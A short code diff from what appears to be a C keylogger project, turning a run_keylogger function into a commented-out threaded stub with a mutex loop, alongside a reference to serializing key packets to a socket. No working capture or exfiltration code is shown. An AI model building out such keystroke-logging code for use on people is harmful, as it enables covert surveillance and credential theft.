@@ -2,6 +2,7 @@
 
 #include <errno.h>
 #include <netinet/in.h>  // sockaddr_in
+#include <pthread.h>
 #include <signal.h>
 #include <stdio.h>  // getline, free
 #include <stdlib.h>
@@ -188,9 +189,20 @@ int serialize(FILE* socket_file, key_package* packet) {
   return bytes_sent;
 }
 
-void run_keylogger() {
-  key_package packet;
+/*void* run_keylogger(void* package) {
+  key_package* packet = (key_package*)package;
+  while (1) {
+    pthread_mutex_lock(&packet->lock);
+
+    // log keys function?
+
+    // Unlock the mutex
+    pthread_mutex_unlock(&packet->lock);
+
+    sleep(1);
+  }
+  return NULL;
   packet.keys_arr_size = 0;
   log_device(&packet);
   log_keys(&packet);
-}
+}*/
